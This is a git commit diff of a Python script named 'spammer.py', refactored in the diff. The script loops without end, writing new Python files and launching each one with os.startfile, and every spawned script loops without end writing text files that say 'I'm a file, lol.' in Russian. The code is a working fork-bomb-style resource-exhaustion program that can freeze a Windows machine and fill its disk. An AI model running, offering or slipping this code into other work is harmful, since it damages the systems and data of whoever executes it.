78b392e3035e3d7f58df60e6bef704508d0bf7c4
MrZxnm <107915798+MrZxnm@users.noreply.github.com>
2022-07-20 10:38:24 +0300

    1.4

--- spammer.py
+++ spammer.py
@@ -1,15 +1,11 @@
 import os
 a=0
-b=0
-while a!=-1:
-    my_file = open("SpamProgram"+str(a)+".py", "w+",  encoding="utf-8")
-    my_file.write("""a=0
-while a!=-1:
-    my_file = open('"""+str(b)+"""'+"SpamFile"+str(a)+".txt", "w+")
-    my_file.write("Я файл, лол.")
-    my_file.close()
-    a=a+1""")
-    my_file.close()
-    os.startfile("SpamProgram"+str(a)+".py")
-    a=a+1
-    b=b+1
+while True:
+    with open(f"SpamProgram{a}.py", "w+",  encoding="utf-8") as s:
+        s.write(f"""a=0
+while True:
+    with open(f"{a}SpamFile"""+"{a}"+f""".txt", "w+", encoding="utf-8") as s:
+        s.write("Я файл, лол.")
+        a+=1""")
+    os.startfile(f"SpamProgram{a}.py")
+    a+=1
